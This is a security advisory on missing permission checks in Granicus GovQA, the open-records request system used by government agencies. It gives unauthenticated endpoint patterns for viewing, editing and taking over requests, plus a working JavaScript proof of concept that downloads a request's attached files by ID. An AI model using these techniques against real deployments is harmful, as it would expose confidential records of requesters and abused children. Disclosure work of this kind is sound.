# Granicus GovQA

## Description

Insufficient permission check vulnerabilities in Granicus's GovQA allowed unauthorized access to view, edit, and change ownership of open records requests[^1], including restricted-access confidential records. By changing ownership of a request, an attacker could effectively deny a legitimate user's access to that request. The vulnerabilities affected various deployments, including numerous Departments of Children and Family Services or their equivalents, which handle highly sensitive records of domestic violence and sexual abuse allegations against children.

## Details

The vulnerabilities allowed attackers to perform several unauthorized actions, as detailed below.

- To view request details, an attacker could access `RequestOpen.aspx?rid=<requestId>` or `RequestOpenCI.aspx?rid=<requestId>`, allowing them to view the name and other private information about the requester, as well as full details of the request.
- To edit request details, an attacker could access `RequestOpenCI.aspx?rid=<requestId>` to modify any field originally set by the requester.
- To change ownership of requests, an attacker could access `RequestOpenCI.aspx?rid=<requestId>` to manipulate the email field to assign ownership to their own account, another user's account, or to an email address not associated with an existing user.
- To download files attached to a request, which include those uploaded by the requester and the responding organization, an attacker could send a `POST` request to `RequestEdit.aspx/DownloadAll` with the data `{ itemId: <requestId> }`. This action would return a URL similar to `/temp/<requestId>.zip`, which could then be used to download the files. A proof of concept exploit is included below.

The sequential numbering of Request IDs makes it trivial for attackers to discover other requests, posing future risk to the system.

In a clear effort to protect its brand value, Granicus has deemed this issue low severity[^2], showcasing an egregious disregard for industry-standards, such as the Common Vulnerability Scoring System (CVSS).

CVSS: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Proof of Concept

```JavaScript
/*
 * Download all files for the request currently being viewed.
 * No authentication is required.
 */
DownloadFiles((new URL(window.location)).searchParams.get('rid'));

async function DownloadFiles(itemId) {
  const result = await fetch("RequestEdit.aspx/DownloadAll", {
    method: "POST",
    body: JSON.stringify({
      itemId: itemId
    }),
    headers: {"Content-Type": "application/json; charset=utf-8"}
  })
  if (result.status !== 200) {
      console.log(`Unable to download archive for ${itemId}.`);
      return;
  }
  const json = await result.json();
  console.log(`Attempting to download ${json.d}`);
  window.location=`.${json.d}`;
}
```

Many hours of unpaid labor[^4] are put into researching and disclosing vulnerabilities.

[^1]: _The term "open" in "open records requests" can be misleading, as not all "open" requests are intended for public access. Many state and local governments have exceptions regarding the types of information that can be requested and the individuals permitted to access it. For instance, individuals directly affected by a record may have a legal right to request access regardless of public release exemptions. However, accessing such requests may pose security risks, as sensitive information could be downloaded by attackers. Furthermore, different states have varying requirements for requesting access, with some jurisdictions requiring proof of identity or residency. For example, Tennessee mandates requestors to upload a copy of their State ID to prove residency, potentially exposing personal information to unauthorized access._
